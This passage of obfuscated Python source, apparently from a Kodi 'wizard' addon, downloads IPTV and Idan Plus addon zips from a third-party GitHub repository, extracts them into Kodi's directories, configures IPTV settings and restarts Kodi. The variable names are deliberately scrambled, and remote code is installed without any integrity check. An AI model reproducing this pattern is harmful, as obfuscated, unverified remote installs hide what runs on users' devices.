                      O0OOOO0OOOOOOO000 =O0OOOO0OOOOOOO000 /1024 #line:5652
                    else :#line:5653
                     O0OOOO0OOOOOOO000 =0 #line:5654
                    OO0O00O0O000OO0OO ='KB'#line:5655
                    if O0OOOO0OOOOOOO000 >=1024 :#line:5656
                       O0OOOO0OOOOOOO000 =O0OOOO0OOOOOOO000 /1024 #line:5657
                       OO0O00O0O000OO0OO ='MB'#line:5658
                    if O0OOOO0OOOOOOO000 >0 and not O0OOOO0O0OOO0000O ==100 :#line:5659
                        O00OO00O0OOO000OO =(O00000O00O0O00OO0 -O0000O00000OOO0O0 )/O0OOOO0OOOOOOO000 #line:5660
                    else :#line:5661
                        O00OO00O0OOO000OO =0 #line:5662
                    OOO00000O00O00O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOOO0OOOOOOO000 ,OO0O00O0O000OO0OO )#line:5663
                    O0OO000O00O00OO0O .update (int (O0OOOO0O0OOO0000O ),"Downloading "+'iptv',OOOO0O000OO00000O ,OOO00000O00O00O00 )#line:5665
              OO0OO00000000OOO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5668
              O0O000O00O0O0O0O0 .close ()#line:5671
              extract .all (O00OOO0OO00O000O0 ,OO0OO00000000OOO0 ,O0OO000O00O00OO0O )#line:5672
              try :#line:5673
                os .remove (O00OOO0OO00O000O0 )#line:5674
              except :#line:5676
                pass #line:5677
              O0OO000O00O00OO0O .close ()#line:5678
def iptvkodi17_18 ():#line:5679
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:5682
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5683
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5684
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5688
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:5689
              O0O0OOO00O00O00O0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5691
              OOO000000O0OOO0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5692
              OO000OO000OO0OO00 =xbmcgui .DialogProgress ()#line:5693
              OO000OO000OO0OO00 .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:5694
              O0OOO0O0O0OOO0000 =os .path .join (OOO000000O0OOO0OO ,'isr.zip')#line:5695
              OO00O0000O000O000 =urllib2 .Request (O0O0OOO00O00O00O0 )#line:5696
              OOOOOO0OOOOOO0OO0 =urllib2 .urlopen (OO00O0000O000O000 )#line:5697
              OO0OOO00OO000OOOO =xbmcgui .DialogProgress ()#line:5699
              OO0OOO00OO000OOOO .create ("Downloading","Downloading "+'iptv')#line:5700
              OO0OOO00OO000OOOO .update (0 )#line:5701
              OOOOO0O0O00OOOOOO =open (O0OOO0O0O0OOO0000 ,'wb')#line:5703
              try :#line:5705
                O00000OOO0OO0OOOO =OOOOOO0OOOOOO0OO0 .info ().getheader ('Content-Length').strip ()#line:5706
                OO0O0O00O0OO00O00 =True #line:5707
              except AttributeError :#line:5708
                    OO0O0O00O0OO00O00 =False #line:5709
              if OO0O0O00O0OO00O00 :#line:5711
                    O00000OOO0OO0OOOO =int (O00000OOO0OO0OOOO )#line:5712
              O00O0OO0000O00OO0 =0 #line:5714
              O0O00OOO0O0O00O00 =time .time ()#line:5715
              while True :#line:5716
                    OO0OO00OOO00OOO0O =OOOOOO0OOOOOO0OO0 .read (8192 )#line:5717
                    if not OO0OO00OOO00OOO0O :#line:5718
                        sys .stdout .write ('\n')#line:5719
                        break #line:5720
                    O00O0OO0000O00OO0 +=len (OO0OO00OOO00OOO0O )#line:5722
                    OOOOO0O0O00OOOOOO .write (OO0OO00OOO00OOO0O )#line:5723
                    if not OO0O0O00O0OO00O00 :#line:5725
                        O00000OOO0OO0OOOO =O00O0OO0000O00OO0 #line:5726
                    if OO0OOO00OO000OOOO .iscanceled ():#line:5727
                       OO0OOO00OO000OOOO .close ()#line:5728
                       try :#line:5729
                        os .remove (O0OOO0O0O0OOO0000 )#line:5730
                       except :#line:5731
                        pass #line:5732
                       break #line:5733
                    O0OO000OO0O0O0O0O =float (O00O0OO0000O00OO0 )/O00000OOO0OO0OOOO #line:5734
                    O0OO000OO0O0O0O0O =round (O0OO000OO0O0O0O0O *100 ,2 )#line:5735
                    OOOOOO000O00O000O =O00O0OO0000O00OO0 /(1024 *1024 )#line:5736
                    O0OOO000O0O000O0O =O00000OOO0OO0OOOO /(1024 *1024 )#line:5737
                    O00OOOOO0000O00OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOOO000O00O000O ,'teal',O0OOO000O0O000O0O )#line:5738
                    if (time .time ()-O0O00OOO0O0O00O00 )>0 :#line:5739
                      O0OO0O0O0O000OOO0 =O00O0OO0000O00OO0 /(time .time ()-O0O00OOO0O0O00O00 )#line:5740
                      O0OO0O0O0O000OOO0 =O0OO0O0O0O000OOO0 /1024 #line:5741
                    else :#line:5742
                     O0OO0O0O0O000OOO0 =0 #line:5743
                    O00O0OOO0O0OO0000 ='KB'#line:5744
                    if O0OO0O0O0O000OOO0 >=1024 :#line:5745
                       O0OO0O0O0O000OOO0 =O0OO0O0O0O000OOO0 /1024 #line:5746
                       O00O0OOO0O0OO0000 ='MB'#line:5747
                    if O0OO0O0O0O000OOO0 >0 and not O0OO000OO0O0O0O0O ==100 :#line:5748
                        O0O00OOO0O0O0O0O0 =(O00000OOO0OO0OOOO -O00O0OO0000O00OO0 )/O0OO0O0O0O000OOO0 #line:5749
                    else :#line:5750
                        O0O00OOO0O0O0O0O0 =0 #line:5751
                    O000000O0000OOO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0O0O0O000OOO0 ,O00O0OOO0O0OO0000 )#line:5752
                    OO0OOO00OO000OOOO .update (int (O0OO000OO0O0O0O0O ),"Downloading "+'iptv',O00OOOOO0000O00OO ,O000000O0000OOO00 )#line:5754
              OOO0OO0OOOOOO0000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5757
              OOOOO0O0O00OOOOOO .close ()#line:5760
              extract .all (O0OOO0O0O0OOO0000 ,OOO0OO0OOOOOO0000 ,OO0OOO00OO000OOOO )#line:5761
              wiz .kodi17Fix ()#line:5763
              try :#line:5765
                os .remove (O0OOO0O0O0OOO0000 )#line:5766
              except :#line:5768
                pass #line:5769
              OO0OOO00OO000OOOO .close ()#line:5770
              xbmc .sleep (5000 )#line:5772
              O000000000O0OOO0O ='התקנת לקוח טלוויזיה חיה'#line:5774
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000000O0OOO0O ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5775
              resetkodi ()#line:5776
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5777
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5778
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:5779
              O0O0OOO00O00O00O0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5780
              OOO000000O0OOO0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5781
              OO000OO000OO0OO00 =xbmcgui .DialogProgress ()#line:5782
              OO000OO000OO0OO00 .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:5783
              O0OOO0O0O0OOO0000 =os .path .join (OOO000000O0OOO0OO ,'isr.zip')#line:5784
              OO00O0000O000O000 =urllib2 .Request (O0O0OOO00O00O00O0 )#line:5785
              OOOOOO0OOOOOO0OO0 =urllib2 .urlopen (OO00O0000O000O000 )#line:5786
              OO0OOO00OO000OOOO =xbmcgui .DialogProgress ()#line:5788
              OO0OOO00OO000OOOO .create ("Downloading","Downloading "+'iptv')#line:5789
              OO0OOO00OO000OOOO .update (0 )#line:5790
              OOOOO0O0O00OOOOOO =open (O0OOO0O0O0OOO0000 ,'wb')#line:5792
              try :#line:5794
                O00000OOO0OO0OOOO =OOOOOO0OOOOOO0OO0 .info ().getheader ('Content-Length').strip ()#line:5795
                OO0O0O00O0OO00O00 =True #line:5796
              except AttributeError :#line:5797
                    OO0O0O00O0OO00O00 =False #line:5798
              if OO0O0O00O0OO00O00 :#line:5800
                    O00000OOO0OO0OOOO =int (O00000OOO0OO0OOOO )#line:5801
              O00O0OO0000O00OO0 =0 #line:5803
              O0O00OOO0O0O00O00 =time .time ()#line:5804
              while True :#line:5805
                    OO0OO00OOO00OOO0O =OOOOOO0OOOOOO0OO0 .read (8192 )#line:5806
                    if not OO0OO00OOO00OOO0O :#line:5807
                        sys .stdout .write ('\n')#line:5808
                        break #line:5809
                    O00O0OO0000O00OO0 +=len (OO0OO00OOO00OOO0O )#line:5811
                    OOOOO0O0O00OOOOOO .write (OO0OO00OOO00OOO0O )#line:5812
                    if not OO0O0O00O0OO00O00 :#line:5814
                        O00000OOO0OO0OOOO =O00O0OO0000O00OO0 #line:5815
                    if OO0OOO00OO000OOOO .iscanceled ():#line:5816
                       OO0OOO00OO000OOOO .close ()#line:5817
                       try :#line:5818
                        os .remove (O0OOO0O0O0OOO0000 )#line:5819
                       except :#line:5820
                        pass #line:5821
                       break #line:5822
                    O0OO000OO0O0O0O0O =float (O00O0OO0000O00OO0 )/O00000OOO0OO0OOOO #line:5823
                    O0OO000OO0O0O0O0O =round (O0OO000OO0O0O0O0O *100 ,2 )#line:5824
                    OOOOOO000O00O000O =O00O0OO0000O00OO0 /(1024 *1024 )#line:5825
                    O0OOO000O0O000O0O =O00000OOO0OO0OOOO /(1024 *1024 )#line:5826
                    O00OOOOO0000O00OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOOO000O00O000O ,'teal',O0OOO000O0O000O0O )#line:5827
                    if (time .time ()-O0O00OOO0O0O00O00 )>0 :#line:5828
                      O0OO0O0O0O000OOO0 =O00O0OO0000O00OO0 /(time .time ()-O0O00OOO0O0O00O00 )#line:5829
                      O0OO0O0O0O000OOO0 =O0OO0O0O0O000OOO0 /1024 #line:5830
                    else :#line:5831
                     O0OO0O0O0O000OOO0 =0 #line:5832
                    O00O0OOO0O0OO0000 ='KB'#line:5833
                    if O0OO0O0O0O000OOO0 >=1024 :#line:5834
                       O0OO0O0O0O000OOO0 =O0OO0O0O0O000OOO0 /1024 #line:5835
                       O00O0OOO0O0OO0000 ='MB'#line:5836
                    if O0OO0O0O0O000OOO0 >0 and not O0OO000OO0O0O0O0O ==100 :#line:5837
                        O0O00OOO0O0O0O0O0 =(O00000OOO0OO0OOOO -O00O0OO0000O00OO0 )/O0OO0O0O0O000OOO0 #line:5838
                    else :#line:5839
                        O0O00OOO0O0O0O0O0 =0 #line:5840
                    O000000O0000OOO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0O0O0O000OOO0 ,O00O0OOO0O0OO0000 )#line:5841
                    OO0OOO00OO000OOOO .update (int (O0OO000OO0O0O0O0O ),"Downloading "+'iptv',O00OOOOO0000O00OO ,O000000O0000OOO00 )#line:5843
              OOO0OO0OOOOOO0000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5846
              OOOOO0O0O00OOOOOO .close ()#line:5849
              extract .all (O0OOO0O0O0OOO0000 ,OOO0OO0OOOOOO0000 ,OO0OOO00OO000OOOO )#line:5850
              wiz .kodi17Fix ()#line:5851
              try :#line:5853
                os .remove (O0OOO0O0O0OOO0000 )#line:5854
              except :#line:5856
                pass #line:5857
              OO0OOO00OO000OOOO .close ()#line:5858
              xbmc .sleep (5000 )#line:5860
              O000000000O0OOO0O ='התקנת לקוח טלוויזיה חיה'#line:5862
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000000O0OOO0O ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5863
              resetkodi ()#line:5864
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5866
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:5867
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5868
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5869
def iptvidanplus ():#line:5870
    O0OO0OO0O0O0000O0 =xbmcaddon .Addon ('plugin.video.idanplus')#line:5871
    O0OO0OO0O0O0000O0 .setSetting ('useIPTV','true')#line:5872
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:5873
    if KODIV >=17 and KODIV <18 :#line:5876
        OO0OOO000OOO0O00O ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:5878
        O000O0OOOOOOO0O00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5879
        OO00O0OOOOOO0O0O0 =xbmcgui .DialogProgress ()#line:5880
        OO00O0OOOOOO0O0O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5881
        O0OOO0000000O000O =os .path .join (PACKAGES ,'isr.zip')#line:5882
        O00O00000O0OOOO00 =urllib2 .Request (OO0OOO000OOO0O00O )#line:5883
        OO0000OO0OOOO0O0O =urllib2 .urlopen (O00O00000O0OOOO00 )#line:5884
        O00O00O0OO0OO000O =xbmcgui .DialogProgress ()#line:5886
        O00O00O0OO0OO000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5887
        O00O00O0OO0OO000O .update (0 )#line:5888
        OOO00OO0000000OOO =open (O0OOO0000000O000O ,'wb')#line:5890
        try :#line:5892
          OOO0OOO00O0OO00O0 =OO0000OO0OOOO0O0O .info ().getheader ('Content-Length').strip ()#line:5893
          O0OO00O0000OOO0O0 =True #line:5894
        except AttributeError :#line:5895
              O0OO00O0000OOO0O0 =False #line:5896
        if O0OO00O0000OOO0O0 :#line:5898
              OOO0OOO00O0OO00O0 =int (OOO0OOO00O0OO00O0 )#line:5899
        OOOO00OO00OO0O000 =0 #line:5901
        O00OOOOO00OO0OOO0 =time .time ()#line:5902
        while True :#line:5903
              OO000OO000O0OO00O =OO0000OO0OOOO0O0O .read (8192 )#line:5904
              if not OO000OO000O0OO00O :#line:5905
                  sys .stdout .write ('\n')#line:5906
                  break #line:5907
              OOOO00OO00OO0O000 +=len (OO000OO000O0OO00O )#line:5909
              OOO00OO0000000OOO .write (OO000OO000O0OO00O )#line:5910
              if not O0OO00O0000OOO0O0 :#line:5912
                  OOO0OOO00O0OO00O0 =OOOO00OO00OO0O000 #line:5913
              if O00O00O0OO0OO000O .iscanceled ():#line:5914
                 O00O00O0OO0OO000O .close ()#line:5915
                 try :#line:5916
                  os .remove (O0OOO0000000O000O )#line:5917
                 except :#line:5918
                  pass #line:5919
                 break #line:5920
              OO000OOOO00O0O000 =float (OOOO00OO00OO0O000 )/OOO0OOO00O0OO00O0 #line:5921
              OO000OOOO00O0O000 =round (OO000OOOO00O0O000 *100 ,2 )#line:5922
              OOO00O00OOOOO0O0O =OOOO00OO00OO0O000 /(1024 *1024 )#line:5923
              OO0OO0000O0O000OO =OOO0OOO00O0OO00O0 /(1024 *1024 )#line:5924
              OO00OOO00O0OO00O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO00O00OOOOO0O0O ,'teal',OO0OO0000O0O000OO )#line:5925
              if (time .time ()-O00OOOOO00OO0OOO0 )>0 :#line:5926
                OOO0O00OO0O0OO0O0 =OOOO00OO00OO0O000 /(time .time ()-O00OOOOO00OO0OOO0 )#line:5927
                OOO0O00OO0O0OO0O0 =OOO0O00OO0O0OO0O0 /1024 #line:5928
              else :#line:5929
               OOO0O00OO0O0OO0O0 =0 #line:5930
              OOO0OO0OOO0O0OOO0 ='KB'#line:5931
              if OOO0O00OO0O0OO0O0 >=1024 :#line:5932
                 OOO0O00OO0O0OO0O0 =OOO0O00OO0O0OO0O0 /1024 #line:5933
                 OOO0OO0OOO0O0OOO0 ='MB'#line:5934
              if OOO0O00OO0O0OO0O0 >0 and not OO000OOOO00O0O000 ==100 :#line:5935
                  OO0OO00OO0OO00000 =(OOO0OOO00O0OO00O0 -OOOO00OO00OO0O000 )/OOO0O00OO0O0OO0O0 #line:5936
              else :#line:5937
                  OO0OO00OO0OO00000 =0 #line:5938
              OOOOOO0O00O000OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0O00OO0O0OO0O0 ,OOO0OO0OOO0O0OOO0 )#line:5939
              O00O00O0OO0OO000O .update (int (OO000OOOO00O0O000 ),OO00OOO00O0OO00O0 ,OOOOOO0O00O000OO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5941
        O000OOO0O00OO0OO0 =xbmc .translatePath (os .path .join ('special://home/'))#line:5944
        OOO00OO0000000OOO .close ()#line:5947
        extract .all (O0OOO0000000O000O ,O000OOO0O00OO0OO0 ,O00O00O0OO0OO000O )#line:5948
        try :#line:5952
          os .remove (O0OOO0000000O000O )#line:5953
        except :#line:5954
          pass #line:5955
        wiz .kodi17Fix ()#line:5956
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5957
        time .sleep (10 )#line:5958
        OO00OOOOO0O00OOO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:5959
        OO00OOOOO0O00OOO0 .setSetting ('epgTimeShift','1.000000')#line:5960
        OO00OOOOO0O00OOO0 .setSetting ('m3uPathType','0')#line:5961
        OO00OOOOO0O00OOO0 .setSetting ('epgPathType','0')#line:5962
        OO00OOOOO0O00OOO0 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:5963
        OO00OOOOO0O00OOO0 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:5964
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:5965
        resetkodi ()#line:5966
    if KODIV >=18 :#line:5969
        iptvkodi18idan ()#line:5971
        wiz .kodi17Fix ()#line:5972
        time .sleep (10 )#line:5974
        OO00OOOOO0O00OOO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:5975
        OO00OOOOO0O00OOO0 .setSetting ('epgTimeShift','1.000000')#line:5976
        OO00OOOOO0O00OOO0 .setSetting ('m3uPathType','0')#line:5977
        OO00OOOOO0O00OOO0 .setSetting ('epgPathType','0')#line:5978
        OO00OOOOO0O00OOO0 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:5979
        OO00OOOOO0O00OOO0 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:5980
        O0OOO0OOOO0OOO0OO ='הגדרת ערוצי עידן פלוס'#line:5981
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0OOOO0OOO0OO ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5982
        resetkodi ()#line:5983
def iptvsimpldown ():#line:5999
    OO00O0000OOOOOO00 =(IPTV18 )#line:6001
    OO0O00OO000OOOOOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6002
    O0000OOOOO0OOO0O0 =xbmcgui .DialogProgress ()#line:6003
    O0000OOOOO0OOO0O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6004
    O000O0O0000O0OO0O =os .path .join (PACKAGES ,'isr.zip')#line:6005
    OO0O0OO000O0000OO =urllib2 .Request (OO00O0000OOOOOO00 )#line:6006
    OO0O0OOOO00OOO0O0 =urllib2 .urlopen (OO0O0OO000O0000OO )#line:6007
    O00000O00O00OOOO0 =xbmcgui .DialogProgress ()#line:6009
    O00000O00O00OOOO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6010
    O00000O00O00OOOO0 .update (0 )#line:6011
    O0O00OO0000OOO00O =open (O000O0O0000O0OO0O ,'wb')#line:6013
    try :#line:6015
      OO0OOOOOO0O0O0OOO =OO0O0OOOO00OOO0O0 .info ().getheader ('Content-Length').strip ()#line:6016
      O0O00OO00000O00OO =True #line:6017
    except AttributeError :#line:6018
          O0O00OO00000O00OO =False #line:6019
    if O0O00OO00000O00OO :#line:6021
          OO0OOOOOO0O0O0OOO =int (OO0OOOOOO0O0O0OOO )#line:6022
    OOOO000OOO0O000OO =0 #line:6024
    OO00O0OOO0O0OO000 =time .time ()#line:6025
    while True :#line:6026
          O0OOOO0OO00O00OO0 =OO0O0OOOO00OOO0O0 .read (8192 )#line:6027
          if not O0OOOO0OO00O00OO0 :#line:6028
              sys .stdout .write ('\n')#line:6029
              break #line:6030
          OOOO000OOO0O000OO +=len (O0OOOO0OO00O00OO0 )#line:6032
          O0O00OO0000OOO00O .write (O0OOOO0OO00O00OO0 )#line:6033
          if not O0O00OO00000O00OO :#line:6035
              OO0OOOOOO0O0O0OOO =OOOO000OOO0O000OO #line:6036
          if O00000O00O00OOOO0 .iscanceled ():#line:6037
             O00000O00O00OOOO0 .close ()#line:6038
             try :#line:6039
              os .remove (O000O0O0000O0OO0O )#line:6040
             except :#line:6041
              pass #line:6042
             break #line:6043
          O0OOOO0O0OOO00OO0 =float (OOOO000OOO0O000OO )/OO0OOOOOO0O0O0OOO #line:6044
          O0OOOO0O0OOO00OO0 =round (O0OOOO0O0OOO00OO0 *100 ,2 )#line:6045
          OO0OO00O000OO00OO =OOOO000OOO0O000OO /(1024 *1024 )#line:6046
          OOOO0OOOOO00OOO0O =OO0OOOOOO0O0O0OOO /(1024 *1024 )#line:6047
          O00O0O0OO0O0OOOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OO00O000OO00OO ,'teal',OOOO0OOOOO00OOO0O )#line:6048
          if (time .time ()-OO00O0OOO0O0OO000 )>0 :#line:6049
            O0O00O0O000OOO0O0 =OOOO000OOO0O000OO /(time .time ()-OO00O0OOO0O0OO000 )#line:6050
            O0O00O0O000OOO0O0 =O0O00O0O000OOO0O0 /1024 #line:6051
          else :#line:6052
           O0O00O0O000OOO0O0 =0 #line:6053
          OO0O0O0OO0OO0OO00 ='KB'#line:6054
          if O0O00O0O000OOO0O0 >=1024 :#line:6055
             O0O00O0O000OOO0O0 =O0O00O0O000OOO0O0 /1024 #line:6056
             OO0O0O0OO0OO0OO00 ='MB'#line:6057
          if O0O00O0O000OOO0O0 >0 and not O0OOOO0O0OOO00OO0 ==100 :#line:6058
              OOO00O0O000OO0000 =(OO0OOOOOO0O0O0OOO -OOOO000OOO0O000OO )/O0O00O0O000OOO0O0 #line:6059
          else :#line:6060
              OOO00O0O000OO0000 =0 #line:6061
          OO0OOO000OOO0O000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O00O0O000OOO0O0 ,OO0O0O0OO0OO0OO00 )#line:6062
          O00000O00O00OOOO0 .update (int (O0OOOO0O0OOO00OO0 ),O00O0O0OO0O0OOOO0 ,OO0OOO000OOO0O000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6064
    OOOOOO00OOO0O00O0 =xbmc .translatePath (os .path .join ('special://home/'))#line:6067
    O0O00OO0000OOO00O .close ()#line:6070
    extract .all (O000O0O0000O0OO0O ,OOOOOO00OOO0O00O0 ,O00000O00O00OOOO0 )#line:6071
    try :#line:6075
      os .remove (O000O0O0000O0OO0O )#line:6076
    except :#line:6077
      pass #line:6078
def testnotify ():#line:6079
	O0OOOOOOO0OO0OOOO =wiz .workingURL (NOTIFICATION )#line:6080
	if O0OOOOOOO0OO0OOOO ==True :#line:6081
		try :#line:6082
			O0O0O000OOO0000OO ,O0000OOOO0OO00O00 =wiz .splitNotify (NOTIFICATION )#line:6083
			if O0O0O000OOO0000OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6084
			if STARTP2 ()=='ok':#line:6085
				notify .notification (O0000OOOO0OO00O00 ,True )#line:6086
		except Exception as OOO0000OO0OO0OO00 :#line:6087
			wiz .log ("Error on Notifications Window: %s"%str (OOO0000OO0OO0OO00 ),xbmc .LOGERROR )#line:6088
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6089
def testnotify2 ():#line:6090
	OO0O0OOOO0O00O000 =wiz .workingURL (NOTIFICATION2 )#line:6091
	if OO0O0OOOO0O00O000 ==True :#line:6092
		try :#line:6093
			OO0O0O000O0OO0OOO ,O0OOO0O0OO000OOO0 =wiz .splitNotify (NOTIFICATION2 )#line:6094
			if OO0O0O000O0OO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6095
			if STARTP2 ()=='ok':#line:6096
				notify .notification2 (O0OOO0O0OO000OOO0 ,True )#line:6097
		except Exception as O00OO0OO00OOO00OO :#line:6098
			wiz .log ("Error on Notifications Window: %s"%str (O00OO0OO00OOO00OO ),xbmc .LOGERROR )#line:6099
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6100
def testnotify3 ():#line:6101
	O00OOO0O00000O0O0 =wiz .workingURL (NOTIFICATION3 )#line:6102
	if O00OOO0O00000O0O0 ==True :#line:6103
		try :#line:6104
			O00OO00OOOO00OO00 ,OOOO0O00O0O00O000 =wiz .splitNotify (NOTIFICATION3 )#line:6105
			if O00OO00OOOO00OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6106
			if STARTP2 ()=='ok':#line:6107
				notify .notification3 (OOOO0O00O0O00O000 ,True )#line:6108
		except Exception as OO0000O000OOOO00O :#line:6109
			wiz .log ("Error on Notifications Window: %s"%str (OO0000O000OOOO00O ),xbmc .LOGERROR )#line:6110
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6111
def wait ():#line:6112
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6113
def infobuild ():#line:6114
	OO0O00O0O000OOO0O =wiz .workingURL (NOTIFICATION )#line:6115
	if OO0O00O0O000OOO0O ==True :#line:6116
		try :#line:6117
			OO0OOOOOO0O0OO000 ,OO0O00OOO0OOO0O00 =wiz .splitNotify (NOTIFICATION )#line:6118
			if OO0OOOOOO0O0OO000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6119
			if STARTP2 ()=='ok':#line:6120
				notify .updateinfo (OO0O00OOO0OOO0O00 ,True )#line:6121
		except Exception as O0OO00O00000O0000 :#line:6122
			wiz .log ("Error on Notifications Window: %s"%str (O0OO00O00000O0000 ),xbmc .LOGERROR )#line:6123
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6124
def servicemanual ():#line:6125
	OO0OOO0OO00O000OO =wiz .workingURL (HELPINFO )#line:6126
	if OO0OOO0OO00O000OO ==True :#line:6127
		try :#line:6128
			O0OO00OOO0OOOO0O0 ,OO0OOO000O00O0O0O =wiz .splitNotify (HELPINFO )#line:6129
			if O0OO00OOO0OOOO0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6130
			notify .helpinfo (OO0OOO000O00O0O0O ,True )#line:6131
		except Exception as O000O000O0OOO0000 :#line:6132
			wiz .log ("Error on Notifications Window: %s"%str (O000O000O0OOO0000 ),xbmc .LOGERROR )#line:6133
